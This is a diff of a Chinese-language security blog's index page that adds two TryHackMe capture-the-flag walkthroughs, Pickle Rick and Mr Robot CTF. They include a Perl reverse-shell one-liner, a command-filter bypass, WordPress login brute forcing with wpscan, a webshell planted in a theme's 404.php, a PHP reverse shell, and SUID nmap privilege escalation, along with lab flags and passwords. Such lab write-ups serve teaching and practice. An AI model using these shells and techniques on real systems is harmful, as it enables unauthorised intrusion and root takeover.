@@ -127,13 +127,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -150,6 +150,125 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/17/Pickle%20Rick%20-Try%20Hack%20ME%E9%9D%B6%E6%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sCh3n">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sCh3n's Blog">
+      <meta itemprop="description" content="一个不入流摆狗密码手">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | sCh3n's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/03/17/Pickle%20Rick%20-Try%20Hack%20ME%E9%9D%B6%E6%9C%BA/" class="post-title-link" itemprop="url">Pickle Rick | Try Hack ME靶机</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-03-17 11:43:12 / 修改时间：11:46:12" itemprop="dateCreated datePublished" datetime="2024-03-17T11:43:12+08:00">2024-03-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/TryHackME/" itemprop="url" rel="index"><span itemprop="name">TryHackME</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/TryHackME/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="pickle-rick-try-hack-me靶机">Pickle Rick | Try Hack ME靶机</h2>
+<p>瞟一眼source，有点信息。</p>
+<p><img
+src="/pictures/Tryhackme/picklerick/image-20240316083810650.png" /></p>
+<p>dirsearch扫一下目录</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.249.222/</span><br><span class="line"></span><br><span class="line">[08:33:49] 200 -    2KB - /assets/</span><br><span class="line">[08:35:06] 200 -  882B  - /login.php</span><br><span class="line">[08:35:55] 200 -   17B  - /robots.txt</span><br></pre></td></tr></table></figure>
+<p>先看robots.txt</p>
+<p><img
+src="/pictures/Tryhackme/picklerick/image-20240316084021353.png" /></p>
+<p>应该是密码，<code>Wubbalubbadubdub</code></p>
+<p>/assets/，没啥东西</p>
+<p><img
+src="/pictures/Tryhackme/picklerick/image-20240316084137372.png" /></p>
+<p>login.php，用刚刚的账号密码试试，进了</p>
+<p>进来是个Command Panel，ls试下</p>
+<p><img
+src="/pictures/Tryhackme/picklerick/image-20240316084559868.png" /></p>
+<p>cat命令用不了？</p>
+<p><img
+src="/pictures/Tryhackme/picklerick/image-20240316084653162.png" /></p>
+<p>双引号绕过
+<code>c""at Sup3rS3cretPickl3Ingred.txt</code>，拿到第一个</p>
+<p><img
+src="/pictures/Tryhackme/picklerick/image-20240316085636031.png" /></p>
+<p>尝试反弹shell，bash不行，好像没有写权限，找了个反弹shell命令生成工具一个个试，没试几下机器崩了只能重启。。</p>
+<p>Prel:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.2.127.214&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+<p>找到第二个</p>
+<p><img
+src="/pictures/Tryhackme/picklerick/image-20240316092410008.png" /></p>
+<p>sudo没有密码，直接看root目录，找到第三个。</p>
+<p><img
+src="\pictures\Tryhackme\picklerick\image-20240316092845073.png" /></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -187,9 +306,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-03-14 20:35:17 / 修改时间：20:37:01" itemprop="dateCreated datePublished" datetime="2024-03-14T20:35:17+08:00">2024-03-14</time>
+      <time title="创建时间：2024-03-14 20:35:17" itemprop="dateCreated datePublished" datetime="2024-03-14T20:35:17+08:00">2024-03-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-03-17 11:45:19" itemprop="dateModified" datetime="2024-03-17T11:45:19+08:00">2024-03-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -201,7 +326,11 @@
         </span>
           ，
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+          <a href="/categories/Web/TryHackME/" itemprop="url" rel="index"><span itemprop="name">TryHackME</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/TryHackME/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
         </span>
     </span>
 
@@ -217,14 +346,56 @@
     <div class="post-body" itemprop="articleBody">
           <h2 id="mr-robot-ctf-try-hack-me靶机">Mr Robot CTF | Try Hack
 ME靶机</h2>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/03/14/Mr%20Robot%20CTF%20-Try%20Hack%20ME%E9%9D%B6%E6%9C%BA/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+<p>进去一看还真以为是个终端再一看是个wordpress。。。</p>
+<p>名字叫robot就先看一眼robots.txt，有两个东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>
+<p>key-1-of-3.txt第一个key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>
+<p>fsocity.dic下载下来是个字典,先用burp爆一下用户名</p>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314191449603.png" /></p>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314191514066.png" /></p>
+<p>可以看到<code>Elliot</code>的长度不一样。</p>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314191614454.png" /></p>
+<p>ERROR信息变了，确实存在这个用户名。</p>
+<p>用wpscan爆破密码，先对字典排序去个重</p>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314191941579.png" /></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.174.114/wp-login --usernames Elliot --passwords 2.dic -t 12</span><br></pre></td></tr></table></figure>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314192535558.png" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">account: Elliot</span><br><span class="line">password: ER28-0652</span><br></pre></td></tr></table></figure>
+<p>后台修改404.php，加入一句话木马，蚁剑直接连http://10.10.141.236/wp-content/themes/twentyfifteen/404.php</p>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314195146431.png" /></p>
+<p>/home/robot下面有个password</p>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314195309902.png" /></p>
+<p><img
+src="/pictures\Tryhackme\myrobotctf\image-20240314195443376.png" /></p>
+<p>直接cat没有权限，权限在robot用户，password.row-md5用cmd5反查一下好家伙收费，换一家pmd5，查出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
+<p>应该就是robot密码了，试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(daemon://home/robot) $ su robot</span><br><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>
+<p>还是得弹个shell</p>
+<p>404.php改成<a
+target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell/php-reverse-shell.php
+at master · pentestmonkey/php-reverse-shell
+(github.com)</a>，本地起个<code>nc -lnvp 1234</code>，再用<code>python -c "import pty; pty.spawn('/bin/bash')"</code>生成一个正常terminal。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/$ su robot</span><br><span class="line">su robot</span><br><span class="line">Password: abcdefghijklmnopqrstuvwxyz</span><br><span class="line">robot@linux:/$ cd ~</span><br><span class="line">cd ~</span><br><span class="line">robot@linux:~$ ls</span><br><span class="line">ls</span><br><span class="line">key-2-of-3.txt  password.raw-md5</span><br><span class="line">robot@linux:~$ cat key-2-of-3.txt</span><br><span class="line">cat key-2-of-3.txt</span><br><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>
+<p>查看有SUID位权限的程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:~$ find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br><span class="line">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br><span class="line"> 15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping</span><br><span class="line"> 15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount</span><br><span class="line"> 15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount</span><br><span class="line"> 15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6</span><br><span class="line"> 15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su</span><br><span class="line"> 36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd</span><br><span class="line"> 36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp</span><br><span class="line"> 36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh</span><br><span class="line"> 36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn</span><br><span class="line"> 36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd</span><br><span class="line"> 36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo</span><br><span class="line"> 34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap</span><br><span class="line"> 38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign</span><br><span class="line"> 38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line"> 38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
+<p>可用SUID提权的二进制文件整理的几个文章</p>
+<p><a
+target="_blank" rel="noopener" href="https://blog.csdn.net/CoreNote/article/details/122093180">红队笔记之Suid提权浅析与利用方法总结_使用suid提权-CSDN博客</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/80428173">Linux提权————利用SUID提权_centos8对bash命令赋予suid权限,提权查看/etc/shadow-CSDN博客</a></p>
+<p>老版本nmap --interactive提权拿到最后一个key：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:~$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br><span class="line"><span class="meta prompt_">nmap&gt; </span><span class="language-bash">!sh</span></span><br><span class="line">!sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ls</span><br><span class="line">firstboot_done  key-3-of-3.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> key-3-of-3.txt</span></span><br><span class="line">cat key-3-of-3.txt</span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br><span class="line"><span class="meta prompt_">#</span></span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -1003,102 +1174,9 @@ ME靶机</h2>
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/19/NCTF-Crypto/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sCh3n">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="sCh3n's Blog">
-      <meta itemprop="description" content="一个不入流摆狗密码手">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | sCh3n's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/19/NCTF-Crypto/" class="post-title-link" itemprop="url">NCTF Crypto</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-01-19 13:27:31" itemprop="dateCreated datePublished" datetime="2022-01-19T13:27:31+08:00">2022-01-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-06-29 17:56:56" itemprop="dateModified" datetime="2023-06-29T17:56:56+08:00">2023-06-29</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Crypto/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="nctf-crypto-题目复现">NCTF Crypto 题目复现</h1>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/19/NCTF-Crypto/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
 
 </div>
   </main>
